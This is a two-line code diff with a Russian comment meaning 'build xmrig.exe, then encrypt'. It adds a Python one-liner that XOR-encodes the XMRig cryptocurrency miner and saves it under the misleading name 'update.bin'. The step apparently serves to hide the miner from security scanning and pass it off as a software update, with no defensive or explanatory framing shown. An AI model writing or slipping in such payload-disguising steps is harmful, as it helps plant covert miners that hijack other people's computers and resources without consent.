@@ -1,0 +1,2 @@
+# собираем xmrig.exe, затем шифруем
+python -c "import sys; data=open('xmrig.exe','rb').read(); open('update.bin','wb').write(bytes([b^0xAA for b in data]))"
